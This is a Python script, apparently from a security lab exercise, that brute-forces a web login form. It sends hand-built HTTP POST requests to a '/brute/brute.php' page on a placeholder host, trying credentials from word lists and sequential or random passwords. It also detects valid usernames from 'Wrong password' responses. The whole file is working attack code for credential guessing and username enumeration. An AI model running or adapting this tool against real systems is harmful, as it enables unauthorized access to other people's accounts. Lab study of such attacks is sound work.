#!/usr/bin/env python3

import socket, itertools, sys, random

# host computer address
host = "xxx.xxx.xxx.xxx"


"""
This function sends an HTTP request to try and log in
using random combinations of characters for usernames and passwords.
Note: Only tries eight character passwords.
"""
def tryrandompasswords(usernames):
    # set the number of characters in the password and define the letters in the alphabet
    passwordlength = 8
    alphabet = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

    # keep trying passwords until you find the right one or the user presses Ctrl+C
    while True:
        # generate a random password of the corect length
        password = ""
        for i in range(passwordlength):
            # Create a list of passwords in memory
            password = password + alphabet[random.randrange(len(alphabet))]

        # try out the credentials
        result = trycredentials(usernames, [password])

        # if we found the right credentials, return them
        if result != None:
            return result + ["random"]



"""
This function sends an HTTP request to try and log in
using sequential combinations of characters for usernames and passwords.
Note: Only tries four character passwords.
"""
def trysequentialpasswords(usernames):
    # set the number of characters in the password and define the letters in the alphabet
    passwordlength = 4
    alphabet = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

    # Create a list of passwords in memory
    passwords = itertools.product(alphabet, repeat=passwordlength)

    # try each password with the username passed in
    for p in passwords:
        result = trycredentials(usernames, ["".join(p)])

        # if we found the right credentials, return them
        if result != None:
            return result + ["sequential"]

    # All possibilities exhausted and we didn't find the right username/password
    return None



"""
This function sends an HTTP request to try and log in
using the username and password provided.
"""
def trycredentials(usernames, passwords):

    # iterate through all possible username/password combinations
    for uname in usernames:
        for pword in passwords:

            # clean up the string to remove whitespace characters
            uname = uname.strip()
            pword = pword.strip()

            # Define an HTTP POST request template (yes, the indentation bothers me too)
            request = """POST /brute/brute.php HTTP/1.1
Host: {host}
Content-Length: {datalength}
Content-Type: application/x-www-form-urlencoded

{formdata}

"""

            # data to be POSTed
            formdata = "uname={uname}&pword={pword}"
            formdata = formdata.replace("{uname}", uname)
            formdata = formdata.replace("{pword}", pword)

            # calculate the length of the form data
            datalength = len(formdata)

            # build the full HTTP request string
            request = request.replace("{host}", host)
            request = request.replace("{formdata}", formdata)
            request = request.replace("{datalength}", str(datalength))
            request = request.replace("\n", "\r\n")  # Python uses \n but Apache expects \r\n

            # display the password being tried
            print("Trying " + pword)

            # display the request string to be sent
            print(request)

            # send the HTTP request
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, 80))
            s.send(request.encode())

            # gather the HTTP response string from the server
            response = ""
            while True:
                # read the bytes and decode into a plain old Python string
                data = s.recv(2048).decode("utf-8")

                # append the packet data to the full response string
                response = response + data

                # check to see if we've reached the end of the HMTL response
                if (response.rstrip().endswith("</html>")):
                    break
                if ( len(data) < 1 ):
                    break

            # close the connection
            s.close()
            
            # display the response string that was received
            print(response)

            # check if the credentials were correct and return them back, if they are
            if "You have logged in successfully" in response:
                return [uname, pword]
    
            # if a username wasn't provided, then check to see if we've found the right username
            if len(sys.argv) < 3:
                # check if the correct username (but bad password) was provided
                if "Wrong password" in response:
                    return [uname, None]

    # All possibilities exhausted and we didn't find the right username/password
    return None

"""
Main script. Tries to brute force username and password combinations.
"""
def main():

    # read in our usernames and passwords to try
    with open('usernames.txt') as f:
        usernames = f.read().splitlines()
    with open('passwords.txt') as f:
        passwords = f.read().splitlines()


    # check which type of password guessing the user wants to use
    mode = "file"
    if len(sys.argv) > 1:
        mode = sys.argv[1]

    # check if the user provided a username
    if len(sys.argv) > 2:

        # only use the username passed in as the second command line parameter
        usernames = [sys.argv[2]]


    # try using credentials from the usernames.txt and passwords.txt files
    if mode == "file":

        # send the login requests and get the result
        result = trycredentials(usernames, passwords)

    # check to make sure the user entered a valid mode
    if mode not in ["file", "sequential", "random"]:
        print('Invalid mode. Use one of the following: "file", "sequential"')
        exit()

    # try using a sequential series of passwords with the usernames.txt file
    if mode == "sequential":
        
        # send the login requests and get the result
        result = trysequentialpasswords(usernames)

    # try using a random series of passwords with the usernames.txt file
    if mode == "random":
        
        # send the login requests and get the result
        result = tryrandompasswords(usernames)

    # check the result (None means failure)
    if result == None:
        print("Could not find the right username/password combination")
    else:

        # check if we just found a good username
        if result[1] == None:
            print("Found a good username: " + result[0])

        # check if we found both a good username and password
        else:
            print("Found the correct credentials: " + result[0] + "," + result[1])

        if len(result) > 2:
            print("Results found user " + result[2] + " guessing.")


# execute this script
if __name__ == "__main__":
    main()
